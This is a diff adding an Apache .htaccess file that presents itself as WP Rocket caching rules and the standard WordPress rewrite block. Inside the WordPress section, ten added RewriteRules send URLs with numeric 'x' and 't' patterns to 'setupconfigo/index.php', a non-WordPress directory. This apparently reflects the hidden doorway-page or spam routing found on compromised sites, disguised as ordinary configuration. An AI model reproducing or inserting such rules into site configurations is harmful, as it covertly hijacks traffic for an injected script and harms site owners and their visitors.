@@ -1,0 +1,41 @@
+# BEGIN WP Rocket v3.0.5-beta1
+# Use UTF-8 encoding for anything served text/plain or text/html
+AddDefaultCharset UTF-8
+# Force UTF-8 for a number of file formats
+<IfModule mod_mime.c>
+AddCharset UTF-8 .atom .css .js .json .rss .vtt .xml
+</IfModule>
+<IfModule mod_expires.c>
+ExpiresActive On
+ExpiresByType image/jpg "access plus 1 year"
+ExpiresByType image/jpeg "access plus 1 year"
+ExpiresByType image/gif "access plus 1 year"
+ExpiresByType image/x-icon "access plus 1 year"
+ExpiresByType image/png "access plus 1 year"
+ExpiresByType text/css "access plus 1 month"
+ExpiresByType text/x-javascript "access plus 1 month"
+ExpiresByType application/x-shockwave-flash "access plus 1 month"
+ExpiresDefault "access plus 2 days"
+</IfModule>
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^.*[-/]x(\d+)-.*$ setupconfigo/index\.php?id=$1&%{QUERY_STRING} [L]
+RewriteRule ^x(\d+)-.*$ setupconfigo/index\.php?id=$1&%{QUERY_STRING} [L]
+RewriteRule ^t(\d+)[-/].*[-/]x(\d+)-.*$ setupconfigo/index\.php?id=$1-$2&%{QUERY_STRING} [L]
+RewriteRule ^t(\d+)[-/]x(\d+)[-/].*$ setupconfigo/index\.php?id=$1-$2&%{QUERY_STRING} [L]
+RewriteRule ^x(\d+)[-/].*[-/]t(\d+)[-/].*$ setupconfigo/index\.php?id=$2-$1&%{QUERY_STRING} [L]
+RewriteRule ^x(\d+)[-/]t(\d+)[-/].*$ setupconfigo/index\.php?id=$2-$1&%{QUERY_STRING} [L]
+RewriteRule ^.*[-/]x(\d+)[-/]t(\d+)[-/].*$ setupconfigo/index\.php?id=$2-$1&%{QUERY_STRING} [L]
+RewriteRule ^.*[-/]x(\d+)[-/].*[-/]t(\d+)[-/].*$ setupconfigo/index\.php?id=$2-$1&%{QUERY_STRING} [L]
+RewriteRule ^.*[-/]t(\d+)[-/].*[-/]x(\d+)[-/].*$ setupconfigo/index\.php?id=$1-$2&%{QUERY_STRING} [L]
+RewriteRule ^.*[-/]t(\d+)[-/]x(\d+)[-/].*$ setupconfigo/index\.php?id=$1-$2&%{QUERY_STRING} [L]
+
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# END WordPress
